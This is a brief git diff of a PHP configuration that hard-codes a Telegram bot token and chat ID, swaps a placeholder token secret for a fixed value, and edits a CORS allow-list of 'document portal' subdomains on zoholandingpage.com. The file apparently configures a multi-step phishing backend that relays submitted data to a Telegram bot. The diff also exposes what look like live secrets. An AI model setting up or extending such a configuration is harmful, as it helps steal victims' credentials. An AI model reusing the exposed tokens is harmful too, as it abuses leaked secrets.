@@ -21,12 +21,12 @@ $telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id   = "6915371044";
 
 // stateless step1→step2 token
-$TOKEN_SECRET = "CHANGE_THIS_TO_A_LONG_RANDOM_SECRET";
+$TOKEN_SECRET = "3XWbHBENZBzBul6cfevzAoI3XWbHBENZBzBul6cfevzAoI";
 $TOKEN_TTL    = 900; // 15 min
 
 // Allowed frontends for CORS
 $ALLOWED_ORIGINS = [
-    'https://documentportal.zoholandingpage.com',
+    'https://portalaccess.zoholandingpage.com',
     'https://transmission.zoholandingpage.com',
 ];
 
